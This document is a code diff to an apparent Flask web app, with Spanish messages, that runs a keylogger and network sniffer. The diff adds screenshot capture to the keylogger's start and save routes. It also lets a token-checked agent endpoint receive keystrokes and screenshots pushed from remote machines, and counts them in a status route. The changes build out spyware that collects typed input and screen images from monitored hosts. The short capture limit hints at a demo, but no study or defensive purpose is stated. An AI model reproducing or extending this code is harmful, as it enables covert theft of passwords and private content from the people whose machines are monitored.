@@ -154,11 +154,15 @@ def keylogger_start():
     
     try:
         duration = int(data.get('duration', 10))
-        
+        screenshot_interval = int(data.get('screenshot_interval', 5))
+
         if duration < 1 or duration > 30:
             return jsonify({'success': False, 'error': 'La duración debe ser entre 1 y 30 segundos.'}), 400
-        
-        result = keylogger.start(duration=duration)
+
+        if screenshot_interval < 0:
+            screenshot_interval = 0
+
+        result = keylogger.start(duration=duration, screenshot_interval=screenshot_interval)
         return jsonify(result)
         
     except ValueError:
@@ -185,17 +189,18 @@ def save_keylog():
     filepath = data.get('filepath', '').strip()
     keys = data.get('keys', [])
     captured_text = data.get('captured_text', '')
-    
+    screenshots = data.get('screenshots', [])
+
     if not filepath:
         return jsonify({'success': False, 'error': 'Debe indicar la ruta del archivo.'}), 400
-    
+
     if not keys:
         return jsonify({'success': False, 'error': 'No hay teclas para guardar.'}), 400
-    
+
     if not filepath.endswith('.json'):
         filepath += '.json'
-    
-    result = keylogger.save_log(filepath, keys, captured_text)
+
+    result = keylogger.save_log(filepath, keys, captured_text, screenshots=screenshots)
     return jsonify(result)
 
 
@@ -279,12 +284,13 @@ def agent_push_keys():
         return jsonify({'success': False, 'error': 'Token inválido.'}), 403
 
     keys = data.get('keys', [])
+    screenshots = data.get('screenshots', [])
     final = data.get('final', False)
 
     if not isinstance(keys, list):
         return jsonify({'success': False, 'error': 'Formato de teclas inválido.'}), 400
 
-    result = keylogger.receive_remote_keys(keys, final=final)
+    result = keylogger.receive_remote_keys(keys, screenshots=screenshots, final=final)
     return jsonify(result)
 
 
@@ -320,5 +326,6 @@ def agent_status():
         'sniffer_complete': sniffer._remote_complete,
         'keylogger_agent': keylogger_info or None,
         'keylogger_keys': len(keylogger._remote_keys),
+        'keylogger_screenshots': len(keylogger._remote_screenshots),
         'keylogger_complete': keylogger._remote_complete,
     })
